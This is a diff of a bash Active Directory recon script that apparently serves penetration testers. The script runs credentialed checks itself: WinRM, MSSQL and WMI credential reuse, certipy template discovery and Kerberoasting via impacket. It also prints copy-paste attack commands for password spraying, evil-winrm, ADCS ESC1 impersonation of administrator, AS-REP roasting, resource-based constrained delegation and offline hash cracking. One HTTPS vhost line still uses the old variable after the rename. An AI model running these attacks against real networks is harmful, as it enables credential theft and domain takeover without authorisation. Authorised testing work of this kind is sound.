             lightbulb " Maybe try a Password Spary if you know a 'default' Password"
             lightbulb "   ${YELLOW}Copy/Paste:${RESET}"
-            echo -e "        crackmapexec smb ${TARGET} -u $USERS_FILE -p 'ADefaultPassword'"
+            echo -e "        crackmapexec smb ${TARGET_IPV4} -u $USERS_FILE -p 'ADefaultPassword'"
 
             # Feed recon hints
             echo "KERBEROS" >> "$HINT_FILE"
@@ -2283,7 +2696,7 @@ if printf '%s\n' "${OPEN_PORTS[@]}" | grep -qx "135" && \
     info "WMI likely supported — ports 135 and 445 are open"
 
     if [[ -n "$AUTH_USER" && -n "$AUTH_PASS" ]]; then
-        check_wmi_access "$TARGET" "${AUTH_DOMAIN:-$LDAP_DOMAIN}" "$AUTH_USER" "$AUTH_PASS"
+        check_wmi_access "$TARGET_IPV4" "${AUTH_DOMAIN:-$LDAP_DOMAIN}" "$AUTH_USER" "$AUTH_PASS"
     else
         note "No credentials provided — skipping authenticated WMI check"
     fi
@@ -2294,7 +2707,7 @@ if printf '%s\n' "${OPEN_PORTS[@]}" | grep -qx "445"; then
     info "Service Control Manager Detected! - Port 445 open — testing PsExec access"
 
     if [[ -n "$AUTH_USER" && -n "$AUTH_PASS" ]]; then
-        check_psexec_access "$TARGET" "${AUTH_DOMAIN:-$LDAP_DOMAIN}" "$AUTH_USER" "$AUTH_PASS"
+        check_psexec_access "$TARGET_IPV4" "${AUTH_DOMAIN:-$LDAP_DOMAIN}" "$AUTH_USER" "$AUTH_PASS"
     else
         note "No credentials provided — skipping authenticated PsExec check"
     fi
@@ -2303,7 +2716,7 @@ fi
 
 # Verify Creds can Access Domain Controller
 if  $CREDS_PROVIDED && [ $HAS_LDAP -eq 1 ]  ; then
-    if dc_auth_check "$AUTH_USER" "$AUTH_PASS" "${AUTH_DOMAIN:-$LDAP_DOMAIN}" "$TARGET"; then
+    if dc_auth_check "$AUTH_USER" "$AUTH_PASS" "${AUTH_DOMAIN:-$LDAP_DOMAIN}" "$TARGET_IPV4"; then
         echo
         success "${GREEN}Credentials successfully authenticated to Domain Controller!${RESET}"
         echo
@@ -2349,23 +2762,59 @@ if $CREDS_PROVIDED; then
     echo
     info "Single-shot credential reuse check..."   
     # WinRM
-    if printf '%s\n' "${OPEN_PORTS[@]}" | grep -qx "5985" \
-       && command -v crackmapexec >/dev/null; then
+    if [[ "$NTLM_ENABLED" == true ]]; then # WINRM only works when NTLM is available 
+        if printf '%s\n' "${OPEN_PORTS[@]}" | grep -qx "5985" \
+           && command -v crackmapexec >/dev/null ; then
 
-       #echo "[DEBUG] Creds were provided for CME targeting WINRM"
+           #echo "[DEBUG] Creds were provided for CME targeting WINRM"
        
-       info "Trying WinRM:"
-       lightbulb "    ${YELLOW}Copy/Paste:${RESET}"
-             echo -e "        ${GREEN}crackmapexec winrm $TARGET -u '$AUTH_USER' -p '$AUTH_PASS'${RESET}"
-             echo -e "        ${GREEN}netexec winrm $TARGET -u '$AUTH_USER' -p '$AUTH_PASS'${RESET}"
+           info "Trying WinRM:"
+           lightbulb "    ${YELLOW}Copy/Paste:${RESET}"
+           echo -e "        ${GREEN}crackmapexec winrm $TARGET_IPV4 -u '$AUTH_USER' -p '$AUTH_PASS'${RESET}"
+           echo -e "        ${GREEN}netexec winrm $TARGET_IPV4 -u '$AUTH_USER' -p '$AUTH_PASS'${RESET}"
        
-       if crackmapexec winrm "$TARGET" -u "$AUTH_USER" -p "$AUTH_PASS" 2>/dev/null \
-                | grep -qP 'WINRM\s+\S+\s+\d+\s+\S+\s+\[\+\]'; then
-            critical "WinRM Credential Access Confirmed!"
-            WINRM_DETECTED=true
-            echo -e "        ${GREEN}evil-winrm -i ${AUTH_DOMAIN:-$LDAP_DOMAIN} -u $AUTH_USER -p '$AUTH_PASS'${RESET}"
+           if crackmapexec winrm "$TARGET_IPV4" -u "$AUTH_USER" -p "$AUTH_PASS" 2>/dev/null \
+                    | grep -qP 'WINRM\s+\S+\s+\d+\s+\S+\s+\[\+\]'; then
+                critical "WinRM Credential Access Confirmed!"
+                WINRM_DETECTED=true
+                echo -e "        ${GREEN}evil-winrm -i ${AUTH_DOMAIN:-$LDAP_DOMAIN} -u $AUTH_USER -p '$AUTH_PASS'${RESET}"
+            else
+                warn "WinRM authentication failed or not permitted"
+            fi
+        fi
+    else
+        info "Skipping WinRM: Requires NTLM to be Enabled"
+    fi
+    
+    # WMI via Kerberos
+    if [[ "$NTLM_ENABLED" == false && "$KERBEROS_AUTH_OK" == true ]] \
+       && command -v wmiexec.py >/dev/null; then
+        # Determine ticket location
+        KRB5_CC_FILE="${KRB5CCNAME:-/tmp/krb5cc_$(id -u)}"
+        info "Trying WMI via Kerberos:"
+        if [[ ! -f "$KRB5_CC_FILE" ]]; then
+            warn "Kerberos cache file not found: $KRB5_CC_FILE"
+            warn "Run 'kinit ${AUTH_USER}@${LDAP_DOMAIN^^}' before proceeding."
+        elif ! klist "$KRB5_CC_FILE" | grep -q "${AUTH_USER}@${LDAP_DOMAIN^^}"; then
+            warn "Kerberos ticket does not match user: ${AUTH_USER}@${LDAP_DOMAIN^^}"
+            klist "$KRB5_CC_FILE"
         else
-            warn "WinRM authentication failed or not permitted"
+            
+            lightbulb "   ${YELLOW}Copy/Paste:${RESET}"
+            echo -e "        ${GREEN}impacket-wmiexec ${LDAP_DOMAIN}/${AUTH_USER}@${LDAP_DC_HOST} -dc-ip $TARGET_IPV4 -k -no-pass${RESET}"
+
+            WMIOUT=$(timeout 10 impacket-wmiexec "${LDAP_DOMAIN}/${AUTH_USER}@${LDAP_DC_HOST}" \
+                        -dc-ip "$TARGET_IPV4" -k -no-pass 2>&1)
+
+            if echo "$WMIOUT" | grep -qi "WBEM_E_ACCESS_DENIED"; then
+                warn "WMI access denied: user lacks DCOM/WMI permissions on target"
+            elif echo "$WMIOUT" | grep -qE "C:\\\\|Microsoft|SMBv"; then
+                critical "WMI Credential Access via Kerberos Confirmed!"
+                WINRM_DETECTED=true
+            else
+                warn "WMI test did not return expected response. Raw output:"
+                echo "$WMIOUT"
+            fi
         fi
     fi
 
@@ -2377,10 +2826,10 @@ if $CREDS_PROVIDED; then
        
         lightbulb "Trying MSSQL:"
         lightbulb "   ${YELLOW}Copy/Paste:${RESET}"
-            echo -e "        ${GREEN}crackmapexec mssql $TARGET -u '$AUTH_USER' -p '$AUTH_PASS'${RESET}"
-            echo -e "        ${GREEN}netexec mssql $TARGET -u '$AUTH_USER' -p '$AUTH_PASS'${RESET}"
+            echo -e "        ${GREEN}crackmapexec mssql $TARGET_IPV4 -u '$AUTH_USER' -p '$AUTH_PASS'${RESET}"
+            echo -e "        ${GREEN}netexec mssql $TARGET_IPV4 -u '$AUTH_USER' -p '$AUTH_PASS'${RESET}"
        
-        if crackmapexec mssql "$TARGET" -u "$AUTH_USER" -p "$AUTH_PASS" 2>/dev/null \
+        if crackmapexec mssql "$TARGET_IPV4" -u "$AUTH_USER" -p "$AUTH_PASS" 2>/dev/null \
             | grep -qi success; then
             critical "MSSQL credential reuse confirmed"
         else
@@ -2398,12 +2847,12 @@ if [[ "$HAS_LDAP" -eq 1 && "$HAS_KERB" -eq 1 && "$ENABLE_ADCS" == true && "$CRED
     if command -v certipy-ad >/dev/null 2>&1; then
         info "Checking for vulnerable AD CS certificate templates"
         echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
-        echo -e "        ${GREEN}certipy-ad find -u '${AUTH_USER}@${AUTH_DOMAIN:-$LDAP_DOMAIN}' -p '$AUTH_PASS' -dc-ip '$TARGET' -vulnerable${RESET}"
+        echo -e "        ${GREEN}certipy-ad find -u '${AUTH_USER}@${AUTH_DOMAIN:-$LDAP_DOMAIN}' -p '$AUTH_PASS' -dc-ip '$TARGET_IPV4' -vulnerable${RESET}"
     
         CERTIPY_OUTPUT=$(certipy-ad find \
             -u "${AUTH_USER}@${AUTH_DOMAIN:-$LDAP_DOMAIN}" \
             -p "$AUTH_PASS" \
-            -dc-ip "$TARGET" \
+            -dc-ip "$TARGET_IPV4" \
             -vulnerable 2>&1)
         CERTIPY_EXIT=$?
 
@@ -2416,7 +2865,7 @@ if [[ "$HAS_LDAP" -eq 1 && "$HAS_KERB" -eq 1 && "$ENABLE_ADCS" == true && "$CRED
             error "Invalid domain credentials supplied"
             lightbulb "Verify username/password"
             lightbulb "Confirm domain format: user@domain"
-            lightbulb "Try manual bind: ldapwhoami -x -D ${AUTH_USER}@${AUTH_DOMAIN:-$LDAP_DOMAIN} -W -H ldap://$TARGET"
+            lightbulb "Try manual bind: ldapwhoami -x -D ${AUTH_USER}@${AUTH_DOMAIN:-$LDAP_DOMAIN} -W -H ldap://$TARGET_IPV4"
             ADCS_SERVICE_DETECTED=true
         fi
         # -------- Clock Skew Detection --------
@@ -2425,7 +2874,7 @@ if [[ "$HAS_LDAP" -eq 1 && "$HAS_KERB" -eq 1 && "$ENABLE_ADCS" == true && "$CRED
 
             lightbulb "Kerberos requires time sync (±5 minutes)"
             lightbulb "Fix on Kali:"
-            echo "    sudo ntpdate -u $TARGET"
+            echo "    sudo ntpdate -u $TARGET_IPV4"
             echo "       OR"
             echo "    sudo timedatectl set-ntp true"
 
@@ -2487,7 +2936,7 @@ if [[ "$HAS_LDAP" -eq 1 && "$HAS_KERB" -eq 1 && "$ENABLE_ADCS" == true && "$CRED
                                  echo -e "    ${RED}${esc}${RESET}  →  ${RED}CRITICAL${RESET}  (10/10)"
                                  echo -e "        ${YELLOW}Instant privilege escalation via certificate enrollment${RESET}"
                                  echo -e "        Exploit Command: "
-                                 echo -e "          ${GREEN}certipy req -u '${AUTH_USER}@${AUTH_DOMAIN:-$LDAP_DOMAIN}' -p '$AUTH_PASS' -template <TEMPLATE> -dc-ip '${TARGET}' -target '[CA].${AUTH_DOMAIN:-$LDAP_DOMAIN}' -ca '${target_ca}' -upn 'administrator@${AUTH_DOMAIN:-$LDAP_DOMAIN}' -sid '[admin_sid]' -dns ${AUTH_DOMAIN:-$LDAP_DOMAIN} -debug${RESET}"
+                                 echo -e "          ${GREEN}certipy req -u '${AUTH_USER}@${AUTH_DOMAIN:-$LDAP_DOMAIN}' -p '$AUTH_PASS' -template <TEMPLATE> -dc-ip '${TARGET_IPV4}' -target '[CA].${AUTH_DOMAIN:-$LDAP_DOMAIN}' -ca '${target_ca}' -upn 'administrator@${AUTH_DOMAIN:-$LDAP_DOMAIN}' -sid '[admin_sid]' -dns ${AUTH_DOMAIN:-$LDAP_DOMAIN} -debug${RESET}"
                                  ;;
                             ESC2|ESC3)
                                  echo -e "    ${YELLOW}${esc}${RESET} →  ${YELLOW}HIGH${RESET}      (8/10)"
@@ -2526,7 +2975,7 @@ if [[ "$HAS_LDAP" -eq 1 && "$HAS_KERB" -eq 1 && "$ENABLE_ADCS" == true && "$CRED
                 fi
 
                 lightbulb "Next steps (manual exploitation):"
-                echo -e "    certipy-ad req -u '${AUTH_USER}@${AUTH_DOMAIN:-$LDAP_DOMAIN}' -p '$AUTH_PASS' -template <TEMPLATE> -dc-ip $TARGET"
+                echo -e "    certipy-ad req -u '${AUTH_USER}@${AUTH_DOMAIN:-$LDAP_DOMAIN}' -p '$AUTH_PASS' -template <TEMPLATE> -dc-ip $TARGET_IPV4"
                 echo -e "    certipy-ad auth -pfx user.pfx"
 
             else
@@ -2569,13 +3018,13 @@ if [[ "$ENABLE_KERBROAST" == true && "$CREDS_PROVIDED" == true && "$HAS_KERB" -e
     alert "Kerberoast Candidates Identified"
     info  "Attempting Kerberoast via Impacket"
     lightbulb "Manual fallback:"
-    echo -e "  ${GREEN}impacket-GetUserSPNs '${AUTH_DOMAIN:-$LDAP_DOMAIN}/${AUTH_USER}:${AUTH_PASS}' -dc-ip $TARGET -request${RESET}"
+    echo -e "  ${GREEN}impacket-GetUserSPNs '${AUTH_DOMAIN:-$LDAP_DOMAIN}/${AUTH_USER}:${AUTH_PASS}' -dc-ip $TARGET_IPV4 -request${RESET}"
     echo
 
     # Run Kerberoast safely and capture output
     KERB_OUTPUT=$(impacket-GetUserSPNs \
         "${AUTH_DOMAIN:-$LDAP_DOMAIN}/${AUTH_USER}:${AUTH_PASS}" \
-        -dc-ip "$TARGET" \
+        -dc-ip "$TARGET_IPV4" \
         -request \
         -outputfile "$KERBEROAST_FILE" 2>&1)
     KERB_EXIT=$?
@@ -2598,7 +3047,7 @@ if [[ "$ENABLE_KERBROAST" == true && "$CREDS_PROVIDED" == true && "$HAS_KERB" -e
         if echo "$KERB_OUTPUT" | grep -qi "KRB_AP_ERR_SKEW"; then
             lightbulb "Clock skew detected"
             echo -e "    Fix on Kali:"
-            echo -e "        sudo ntpdate -u $TARGET"
+            echo -e "        sudo ntpdate -u $TARGET_IPV4"
             echo -e "            Or"
             echo -e "        sudo timedatectl set-ntp true"
         fi
@@ -2632,7 +3081,7 @@ if [[ $HAS_KERB -eq 1 && "$ENABLE_KERB_ENUM" == false ]]; then
     echo "  --------------------------------------"
     echo -e "    Re-run with ${BLUE}--kerb-enum${RESET} to attempt safe user enumeration"
     echo "    Example:"
-    echo "      ./bash_simpleportscan.sh $TARGET --kerb-enum"
+    echo "      ./bash_simpleportscan.sh $TARGET_IPV4 --kerb-enum"
 fi
 # -------- Kerberoast Reminder --------
 if [[ -s "$KERBEROAST_FILE" && $HAS_KERB -eq 1 && "$ENABLE_KERBROAST" == false ]]; then
@@ -2641,7 +3090,7 @@ if [[ -s "$KERBEROAST_FILE" && $HAS_KERB -eq 1 && "$ENABLE_KERBROAST" == false ]
     echo "  --------------------------------------"
     echo -e "    Re-run with ${BLUE}--kerberoast${RESET} to attempt kerberoast attack via Impacket"
     echo "    Example:"
-    echo "      ./bash_simpleportscan.sh $TARGET --kerberoast"
+    echo "      ./bash_simpleportscan.sh $TARGET_IPV4 --kerberoast"
 fi
 
 # --------- Detect HTTP/HTTPS availability ----------
@@ -2708,12 +3157,12 @@ if [[ "${#OPEN_PORTS[@]}" -gt 0 && $HAS_WEB -eq 1 ]]; then
                 
                 # Call FFUF if enabled
                 if $ENABLE_WEB_ENUM && command -v ffuf >/dev/null; then
-                    run_ffuf_enum "$SCHEME" "$port" "$TARGET"
+                    run_ffuf_enum "$SCHEME" "$port" "$TARGET_IPV4"
                 fi
 
                 # Call VHOST Fuzzing if enabled
                 if $ENABLE_VHOST && [ -s "$DISCOVERED_HOSTS" ] && command -v curl >/dev/null; then
-                    run_vhost_fuzz "$SCHEME" "$port" "$TARGET"
+                    run_vhost_fuzz "$SCHEME" "$port" "$TARGET_IPV4"
                 fi
             fi
         fi
@@ -2737,8 +3186,8 @@ if $ENABLE_WEB_ENUM && [[ $HAS_WEB -eq 2 ]] && command -v ffuf >/dev/null; then
         echo "    - SCHEME: HTTP"
     fi
     
-    note "Target URL: $SCHEME://$TARGET/FUZZ"
-    echo "   ffuf -u $SCHEME://$TARGET/FUZZ -w [wordlist] -mc 200,204,301,302,307,401,403 -fc 404 -t 50 -timeout 5 -o $FFUF_OUT -of json"
+    note "Target URL: $SCHEME://$TARGET_IPV4/FUZZ"
+    echo "   ffuf -u $SCHEME://$TARGET_IPV4/FUZZ -w [wordlist] -mc 200,204,301,302,307,401,403 -fc 404 -t 50 -timeout 5 -o $FFUF_OUT -of json"
     note " Try with a Larger WordList ($WORDLIST)..."
         
     # ---- Run ffuf with inline wordlist ----
@@ -2748,7 +3197,7 @@ if $ENABLE_WEB_ENUM && [[ $HAS_WEB -eq 2 ]] && command -v ffuf >/dev/null; then
     # PHP variants
     printf "%s\n" "${COMMON_FUFF_PATHS[@]/%/.php}" > "$FFUF_WORDLIST"
     
-    ffuf -u "$SCHEME://$TARGET/FUZZ" -w $FFUF_WORDLIST \
+    ffuf -u "$SCHEME://$TARGET_IPV4/FUZZ" -w $FFUF_WORDLIST \
         -mc 200,204,301,302,307,401,403 \
         -fc 404 \
         -t 50 \
@@ -2764,7 +3213,7 @@ if $ENABLE_WEB_ENUM && [[ $HAS_WEB -eq 2 ]] && command -v ffuf >/dev/null; then
         # Extract interesting paths (jq required)
         if command -v jq >/dev/null; then
             jq -r '.results[].url' "$FFUF_OUT" \
-            | sed "s|$SCHEME://$TARGET||" \
+            | sed "s|$SCHEME://$TARGET_IPV4||" \
             | sort -u \
             | while read -r path; do
                 echo "    - $path"
@@ -2785,16 +3234,16 @@ if $ENABLE_VHOST && [ -s "$DISCOVERED_HOSTS" ] && [ $HAS_WEB -eq 2 ] && command 
     echo -e "${YELLOW}[i]${RESET} Running VHost fuzzing..."
 
     COMMON_VHOSTS=(admin api dev test staging beta internal portal dashboard)
-    [ "$HTTP_FOUND" = true ] && BASE_HTTP_LEN=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" "http://$TARGET")
-    [ "$HTTPS_FOUND" = true ] && BASE_HTTPS_LEN=$(curl -ks -o /dev/null -w "%{http_code}:%{size_download}" "https://$TARGET")
+    [ "$HTTP_FOUND" = true ] && BASE_HTTP_LEN=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" "http://$TARGET_IPV4")
+    [ "$HTTPS_FOUND" = true ] && BASE_HTTPS_LEN=$(curl -ks -o /dev/null -w "%{http_code}:%{size_download}" "https://$TARGET_IPV4")
 
     sort -u "$DISCOVERED_HOSTS" | grep -v '^$' | while read base; do
         echo -e "    [~] Fuzzing base domain: $base"
         for word in "${COMMON_VHOSTS[@]}"; do
             vhost="$word.$base"
             if [ "$HTTP_FOUND" = true ]; then
-                len=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" -H "Host: $vhost" "http://$TARGET")
-                [ "$len" != "$BASE_HTTP_LEN" ] && echo -e "${YELLOW}      [+] Possible HTTP VHost: $vhost${RESET}" && echo "$TARGET $vhost" >> "$HOSTS_FILE"
+                len=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" -H "Host: $vhost" "http://$TARGET_IPV4")
+                [ "$len" != "$BASE_HTTP_LEN" ] && echo -e "${YELLOW}      [+] Possible HTTP VHost: $vhost${RESET}" && echo "$TARGET_IPV4 $vhost" >> "$HOSTS_FILE"
             fi
             if [ "$HTTPS_FOUND" = true ]; then
                 len=$(curl -ks -o /dev/null -w "%{http_code}:%{size_download}" -H "Host: $vhost" "https://$TARGET")
@@ -2841,7 +3290,7 @@ if [ -s "$HOSTS_FILE" ]; then
         alert "${BLUE}Tip:${RESET} /etc/hosts suggestions:"
         echo "  ----------------------------"
         for line in "${MISSING_LINES[@]}"; do
-            echo "    $line"
+            echo -e "    ${YELLOW}$line${RESET}"
         done
     fi
 fi
@@ -2985,7 +3434,7 @@ attack_path_evaluation() {
         ATTACK_PATHS+=("Kerberoasting")
         critical "Attack Path: Kerberoasting viable"
         lightbulb "Next Steps (Kerberoasting):"
-        echo "   - Request service tickets (netexec ldap $TARGET -u $AUTH_USER -p '$AUTH_PASS' --kerberoasting output.txt / GetUserSPNs.py)"
+        echo "   - Request service tickets (netexec ldap $TARGET_IPV4 -u $AUTH_USER -p '$AUTH_PASS' --kerberoasting output.txt / GetUserSPNs.py)"
         if [[ -n "$KERBEROAST_OUT" ]]; then
             echo "   - Or run John on Kerberoast Account Output: "
             echo "         john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs $KERBEROAST_OUT"
@@ -3024,7 +3473,7 @@ attack_path_evaluation() {
         ATTACK_PATHS+=("AS-REP Roasting (User hashes obtainable)")
         critical "Attack Path: AS-REP Roasting Possible (User hashes obtainable)"
         lightbulb "Next Steps:"
-        echo "   - Request AS-REP hashes (GetNPUsers.py / netexec / crackmapexec ldap $TARGET -u username -p 'password' --asreproast output.txt)"
+        echo "   - Request AS-REP hashes (GetNPUsers.py / netexec / crackmapexec ldap $TARGET_IPV4 -u username -p 'password' --asreproast output.txt)"
         echo "   - Crack hashes offline (hashcat mode 18200)"
         echo "   - Re-test LDAP/SMB/WinRM with cracked creds"
         echo
@@ -3036,7 +3485,7 @@ attack_path_evaluation() {
         critical "Attack Path: Resource-Based Constrained Delegation candidate"
         lightbulb "Next Steps:"
         echo "   - Create a new computer account (MAQ abuse)"
-        echo "       * netexec ldap $TARGET -u <user> -p <pass> --add-computer <name>$ <pass>"
+        echo "       * netexec ldap $TARGET_IPV4 -u <user> -p <pass> --add-computer <name>$ <pass>"
         echo "   - Identify writable target computer object"
         echo "   - Set msDS-AllowedToActOnBehalfOfOtherIdentity"
         echo "       * rbcd.py <domain>/<user>:<pass> -t <target_computer> -f <new_computer>$"
